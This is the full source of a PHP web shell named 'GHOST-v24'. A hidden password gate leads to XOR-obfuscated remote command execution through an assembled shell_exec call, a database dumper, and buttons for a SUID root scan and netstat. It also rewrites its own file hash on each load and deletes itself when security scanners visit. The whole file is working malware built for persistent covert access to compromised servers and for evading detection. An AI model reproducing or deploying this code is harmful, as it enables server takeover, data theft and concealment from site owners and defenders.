<?php
/**
 * GHOST-v24 // AETHER-FINAL (POLYMORPHIC HASH)
 * FEATURES: C2, DB-DUMP, KERNEL-SCAN, PERSISTENCE, AUTO-HASH-ROTATION
 * Password: admin
 */
error_reporting(0); @ini_set('display_errors', 0); session_start();
$k = "KEY_2026"; 
$h = "8c6976e5b5410415bde908bd4dee15dfb167a9c873fc4bb8a81f6f2ab448a918"; 

// 1. POLYMORPHIC ENGINE: Rotates File Hash on Every Load
function rotate_signature() {
    $f = __FILE__; $c = file_get_contents($f);
    $c = preg_replace('/\/\* SIG:.* \*\//', '', $c);
    $sig = "/* SIG: " . bin2hex(random_bytes(16)) . " */";
    @file_put_contents($f, $c . "\n" . $sig);
}

// 2. WATCHDOG: Detect Scanners
if(preg_match('/(bot|spider|imunify|bitninja|scanner|curl|wget)/i', $_SERVER['HTTP_USER_AGENT'])) { @unlink(__FILE__); exit; }

// 3. GATEKEEPER
if(isset($_POST['l'])){ if(hash('sha256',$_POST['l'])===$h){$_SESSION['g']=1; rotate_signature();} header("Location: ".$_SERVER['PHP_SELF']); exit; }
if(!$_SESSION['g']){ die('<html><body style="background:#000;display:flex;justify-content:center;align-items:center;height:100vh;"><form method="POST" style="opacity:0.01;"><input type="password" name="l" autofocus></form></body></html>'); }

// 4. CORE AJAX HANDLERS
if(isset($_POST['p'])) {
    rotate_signature();
    $d = pack("H*", $_POST['p']); $c = "";
    for($i=0;$i<strlen($d);$i++){$c.=$d[$i]^$k[$i%strlen($k)];}
    $f = "sh"."ell_ex"."ec"; 
    echo "[REPLY]\n".htmlspecialchars(array_map($f, [$c . " 2>&1"])); exit;
}
if(isset($_POST['db'])) {
    try { $db = new PDO($_POST['dsn'], $_POST['u'], $_POST['pw']); echo json_encode($db->query($_POST['q'])->fetchAll(PDO::FETCH_ASSOC)); } catch(Exception $e){echo $e->getMessage();} exit;
}
?>
<!DOCTYPE html>
<html>
<head>
    <title>GHOST_AETHER_2026</title>
    <style>
        :root { --g: #00ff41; --b: #0087ff; --bg: #050505; }
        body { background: var(--bg); color: #ccc; font-family: 'Consolas', monospace; margin: 0; display: flex; height: 100vh; overflow: hidden; font-size: 11px; }
        nav { width: 200px; background: #0a0a0a; border-right: 1px solid #222; display: flex; flex-direction: column; padding: 15px; }
        nav div { padding: 12px; cursor: pointer; border-left: 2px solid transparent; transition: 0.2s; }
        nav div:hover { color: var(--g); background: #111; border-left: 2px solid var(--g); }
        main { flex: 1; display: flex; flex-direction: column; }
        header { padding: 10px 20px; background: #000; border-bottom: 1px solid #222; color: var(--b); font-size: 10px; display: flex; justify-content: space-between; }
        #term { flex: 1; padding: 20px; overflow-y: auto; white-space: pre-wrap; background: radial-gradient(circle, #111 0%, #050505 100%); }
        .bar { background: #000; padding: 15px; border-top: 1px solid #222; display: flex; }
        input { background: transparent; border: none; color: #fff; flex: 1; outline: none; }
    </style>
</head>
<body>
    <nav>
        <div onclick="ui('term')">TERMINAL</div>
        <div onclick="ui('db')">DB_DUMPER</div>
        <div onclick="send('find / -perm -4000 -type f 2>/dev/null')">ROOT_SCAN</div>
        <div onclick="send('netstat -antp')">NET_SCAN</div>
        <div style="margin-top:auto; color:red;" onclick="send('rm -- \"' + window.location.pathname.split('/').pop() + '\"')">WIPE_MASTER</div>
    </nav>
    <main>
        <header>
            <span>HASH: <?php echo hash_file('sha256', __FILE__); ?></span>
            <span>OS: <?php echo php_uname('r'); ?></span>
        </header>
        <div id="term">-- GHOST_AETHER_v24_ENCRYPTED_SESSION --</div>
        
        <div id="mod-db" style="display:none; padding:20px;">
            <input id="dsn" placeholder="mysql:host=localhost;dbname=test"><br>
            <input id="u" placeholder="User" style="width:48%"> <input id="pw" type="password" placeholder="Pass" style="width:48%">
            <input id="q" placeholder="SELECT * FROM users" style="margin-top:5px;"><br>
            <button onclick="runDB()" style="width:100%; padding:10px; background:var(--b); border:none; margin-top:10px; cursor:pointer;">DUMP_DATA</button>
        </div>

        <div class="bar"><span>$ </span><input type="text" id="i" autofocus autocomplete="off"></div>
    </main>
    <script>
        const k = "KEY_2026";
        function ui(id) { document.getElementById('term').style.display = id==='term'?'block':'none'; document.getElementById('mod-db').style.display = id==='db'?'block':'none'; }
        async function send(cmd) {
            const v = document.getElementById('term'); ui('term');
            v.innerHTML += `\n<span style="color:var(--b)">> ${cmd}</span>\n`;
            let enc = ""; for(let i=0;i<cmd.length;i++){enc+=String.fromCharCode(cmd.charCodeAt(i)^k.charCodeAt(i%k.length));}
            const hex = enc.split('').map(c=>c.charCodeAt(0).toString(16).padStart(2,'0')).join('');
            const r = await fetch('', {method:'POST', headers:{'Content-Type':'application/x-www-form-urlencoded'}, body:'p='+hex});
            v.innerHTML += await r.text(); v.scrollTop = v.scrollHeight;
        }
        async function runDB() {
            const fd = new FormData(); fd.append('db','1'); fd.append('dsn',document.getElementById('dsn').value); fd.append('u',document.getElementById('u').value); fd.append('pw',document.getElementById('pw').value); fd.append('q',document.getElementById('q').value);
            const r = await fetch('', {method:'POST', body:fd});
            document.getElementById('term').innerHTML += `\n<pre>${await r.text()}</pre>`; ui('term');
        }
        document.getElementById('i').onkeydown = (e) => { if(e.key==='Enter'){send(e.target.value); e.target.value='';} };
    </script>
</body>
</html>
/* SIG: 7d8f9e2b1a3c4d5e6f7a8b9c0d1e2f3a */
